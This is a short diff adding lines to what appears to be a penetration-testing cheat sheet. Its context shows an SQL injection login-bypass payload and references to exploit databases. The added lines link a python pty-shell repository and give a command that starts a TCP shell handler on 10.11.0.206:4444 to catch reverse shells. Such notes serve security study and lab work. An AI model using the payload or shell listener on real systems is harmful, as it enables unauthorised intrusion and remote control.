@@ -328,3 +328,8 @@ admin") or "1"="1"/*
 -------------------------------------------------------------------------------
 SecurityFocus
 Exploit-DB
+
+----------------------
+pty shell:
+https://github.com/infodox/python-pty-shells
+python tcp_pty_shell_handler.py -b 10.11.0.206:4444
